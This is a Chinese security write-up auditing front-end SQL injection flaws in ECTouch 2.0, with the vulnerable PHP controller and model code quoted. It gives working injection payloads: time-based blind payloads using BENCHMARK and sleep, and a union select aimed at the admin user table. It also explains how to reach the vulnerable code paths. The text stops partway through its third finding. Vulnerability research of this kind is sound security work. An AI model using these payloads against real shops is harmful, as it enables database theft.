# Etouch2.0 分析代码审计流程 (二) 前台SQL注入
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x1 前言
​拜读了phpoop师傅的审计文章,心情激动w分,急急忙忙写完手头作业,为了弥补上篇的遗憾,趁热继续认真重读了前台代码(之前没认真读需要登陆的控制器),然后幸运的在各个地方找到了几个还算满意的前台注入。阅读此文,强烈建议,食用开篇作[Ectouch2.0
分析解读代码审计流程](https://www.anquanke.com/post/id/168991),风味更佳。
## 0x2 介绍下ECTOUCH的相关配置
​ 更多内容可以参考上篇文章[Ectouch2.0
分析解读代码审计流程](https://www.anquanke.com/post/id/168991),这里主要针对SQL谈谈。
    1. 程序安装默认关闭debug模式,这样子程序不会输出mysql错误
       `/upload/mobile/include/base/drivers/db/EcMysql.class.php`
       ```php
       //输出错误信息
       public function error($message = '', $error = '', $errorno = '') {
           if (DEBUG) { //false
               $str = " {$message}
                       SQL: {$this->sql}
                       错误详情: {$error}
                       错误代码:{$errorno}";
           } else {
               $str = "出错: $message";
           }
           throw new Exception($str);
       }
       ```
       所以一般考虑盲注,有回显的注入,要不然过于鸡肋了。
## 0x3 谈谈自己审计这个cms的误区
当时我看前台的时候很容易就可以发现limit后面的注入,因为我之前一直认为limit后面只能使用报错注入,然后就没怎么研究直接跳过了,导致第一次没审计出前台注入,后来我找了下资料,发现自己错了,limit后面也可以进行盲注,不过参考下网上文章这种方法只是适用
**5.6.6的5.x系列** ,
为了严谨一点,我本地测试了下,发现的确不行,但是没有去深入了解底层原理,如果有师傅愿意谈谈,实在是我的荣幸,所以说limit后注入是有mysql的版本限制的,所以这里我只分享一个limit后的注入,其他点抛砖引玉。
参考文章:[技术分享：Mysql注入点在limit关键字后面的利用方法
](https://www.freebuf.com/articles/web/57528.html)
> _分享写tips:_
>
> 1.可能有些跟我一样的菜鸟还是不理解要去哪里找注入,这里谈谈我的看法。
>
>
> 首先注入需要交互,也就是需要输入,所以要找个接收参数的点,这个时候直接去看控制器无疑是很好的选择,因为这里是功能点,需要用户来交互,当然不排除有其他的地方,ex。
## 0x5 前台 Flow consignee_list limit限制SQL注入
`upload/mobile/include/apps/default/controllers/FlowController.class.php`
         */
        public function consignee_list() {
            if (IS_AJAX) {
                $start = $_POST ['last']; //可控
                $limit = $_POST ['amount']; //可控
                // 获得用户所有的收货人信息
                $consignee_list = model('Users')->get_consignee_list($_SESSION['user_id'], 0, $limit, $start);//这里传入
                ......................
                die(json_encode($sayList));
                exit();
可控参数如入了`Users`model类里面,跟进函数:
`pload/mobile/include/apps/default/models/UsersModel.class.php`
        function get_consignee_list($user_id, $id = 0, $num = 10, $start = 0) {
            if ($id) {
                $where['user_id'] = $user_id;
                $where['address_id'] = $id;
                $this->table = 'user_address';
                return $this->find($where);
            } else {
                $sql = 'select ua.*,u.address_id as adds_id from ' . $this->pre . 'user_address as ua left join '. $this->pre . 'users as u on ua.address_id =u.address_id'. ' where ua.user_id = ' . $user_id . ' order by ua.address_id limit ' . $start . ', ' . $num; //很明显没有单引号,直接拼接进去造成了注入。
                return $this->query($sql);
            }
        }
然后回头看下调用需要满足的条件:
`if (IS_AJAX) {`
下面介绍下寻找定义的技巧,(ps我以前第一次审计的时候看这东西很懵b,因为没有弄过开发,木有经验。)
`IS_AJAX` 这种很明显就是宏定义,直接搜索`define('IS_AJAX'`
        public function __construct() {
            $this->model = model('Base')->model;
            $this->cloud = Cloud::getInstance();
            // 定义当前请求的系统常量
            define('NOW_TIME', $_SERVER ['REQUEST_TIME']);
            define('REQUEST_METHOD', $_SERVER ['REQUEST_METHOD']);
            define('IS_GET', REQUEST_METHOD == 'GET' ? true : false );
            define('IS_POST', REQUEST_METHOD == 'POST' ? true : false );
            define('IS_PUT', REQUEST_METHOD == 'PUT' ? true : false );
            define('IS_DELETE', REQUEST_METHOD == 'DELETE' ? true : false );
            define('IS_AJAX', (isset($_SERVER ['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER ['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')); 
            load_file(ROOT_PATH . 'data/certificate/appkey.php');
        }
控制器基类的构造函数里面定义了：`define('IS_AJAX',);`
所以利用方式就很简单了,两个可控参数都进去sql了,随便取一个
跟进下执行知道:
`$sql=select ua.*,u.address_id as adds_id from ecs_user_address as ua left
join ecs_users as u on ua.address_id =u.address_id where ua.user_id = 0 order
by ua.address_id limit 1,`
然后直接进入查询
`return $this->query($sql);`
所以可以构造payload:
    last=1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)#
关于其他limit点,在介绍一些我的 **skills** :
通过搜索正则 `limit ' .(.*)$num`、`limit.`:
`Searching 48 files for "limit ' .(.*)$num" (regex)`
这些重复的点再分析就很没有意思了,但是limit后注入这个系统很多,你们可以跟着文章去学习找找有趣的点。
## 0x6 前台 Flow done $order [‘shipping_id’]半无限制SQL注入
​ 这个点不像前面那种那么明显可以看出来,这可能就考验我们的耐心去读代码了,这里谈谈我的 **skills**
> ​ **直接正则匹配出sql的语句一条条的读,然后回溯排除。**
​ 下面开始回到漏洞分析上:
`FlowController.class.php`
            if (isset($is_real_good)) {
                $res = $this->model->table('shipping')->field('shipping_id')->where("shipping_id=" . $order ['shipping_id'] . " AND enabled =1")->getOne();
                if (!$res) {
                    show_message(L('flow_no_shipping'));
                }
            }
这里可以看到以字符串形式变量拼接到了where方法里面(字符串拼接及其容易导致SQL注入)
那么我们可以直接回溯前文看下`$order`是否可控:
lines 1094
            $order = array(
                'shipping_id' => I('post.shipping'),//这里可控
                ......................
            );
然后我们看下需要满足什么条件才能执行到漏洞点处:
简单例子分析下:
        public function done() {
            /* 取得购物类型 */
            $flow_type = isset($_SESSION ['flow_type']) ? intval($_SESSION ['flow_type']) : CART_GENERAL_GOODS;
            /* 检查购物车中是否有商品 */
            $condition = " session_id = '" . SESS_ID . "' " . "AND parent_id = 0 AND is_gift = 0 AND rec_type = '$flow_type'";
            $count = $this->model->table('cart')->field('COUNT(*)')->where($condition)->getOne();
            if ($count == 0) {
                show_message(L('no_goods_in_cart'), '', '', 'warning'); //处理下这里
            }
            /* 如果使用库存，且下订单时减库存，则减少库存 */
            if (C('use_storage') == '1' && C('stock_dec_time') == SDT_PLACE) {
                $cart_goods_stock = model('Order')->get_cart_goods();
                $_cart_goods_stock = array();
                foreach ($cart_goods_stock ['goods_list'] as $value) {
                    $_cart_goods_stock [$value ['rec_id']] = $value ['goods_number'];
                }
                model('Flow')->flow_cart_stock($_cart_goods_stock);
                unset($cart_goods_stock, $_cart_goods_stock);
            }
            // 检查用户是否已经登录 如果用户已经登录了则检查是否有默认的收货地址 如果没有登录则跳转到登录和注册页面
            if (empty($_SESSION ['direct_shopping']) && $_SESSION ['user_id'] == 0) {
                /* 用户没有登录且没有选定匿名购物，转向到登录页面 */
                ecs_header("Location: " . url('user/login') . "n"); //这里要处理
            }
主要是处理下
这些跳转停止代码执行的语句
`ecs_header("Location: " . url('user/login') . "n");`
需要用户登陆
`if (empty($_SESSION ['direct_shopping']) && $_SESSION ['user_id'] == 0) {`
后面一些判断条件依次满足就行了,这些都很简单,读读代码,就行了。
你也可以看我怎么利用然后返回去分析代码:
`http://127.0.0.1:8888/ecshop/upload/mobile/?m=default&c=flow&a=done`
直接访问提示购物车没有商品,那就随便注册个用户然后选个实物商品进去购物车
然后`http://127.0.0.1:8888/ecshop/upload/mobile/?m=default&c=flow&a=done`
提示填收货地址那么自己填写收货地址
这个时候就满足条件了：
`post:shipping=1 and sleep(5)%23`
其实这个点还是很有意思的,当时我在想能不能搞个回显注入
            if (isset($is_real_good)) {
                $res = $this->model->table('shipping')->field('shipping_id')->where("shipping_id=" . $order ['shipping_id'] . " AND enabled =1")->getOne();
                if (!$res) { //这里返回了$res
                    show_message(L('flow_no_shipping'));
                }
            }
通过debug跟进到sql执行流程可以得到执行的语句是:
`$sql=SELECT shipping_id FROM ecs_shipping WHERE shipping_id=1 and sleep(1)%23
AND enabled =1 LIMIT 1`
一列,构造下payload:
`post:shipping=-1 union select user_name from ecs_admin_user%23`
那么得到的`$res` 就是管理员的用户名了,后面我跟了下(文件内搜索$res) 没有发现有输出
按照代码逻辑命名来讲,这个返回值相当于布尔判断吧,应该是没有输出的,仅仅起到判断的作用,所以这个前台漏洞只能布尔盲注了,这也是我说这个漏洞叫半限制SQL注入的原因。
## 0x7 前台 Category index 多个参数半限制SQL注入
​ 这个点有点遗憾,但是却引起了我的诸多思考。
​ 接下来的分析就不再花大笔墨去讲基础操作,代码分析,希望你能仔细阅读我前面的分析,然后自己去读代码。
`upload/mobile/include/apps/default/controllers/CategoryController.class.php`
        public function index()
        {
            $this->parameter(); //跟进这里
        private function parameter()
        {
            // 如果分类ID为0，则返回总分类页
            if (empty($this->cat_id)) {
                $this->cat_id = 0;
            }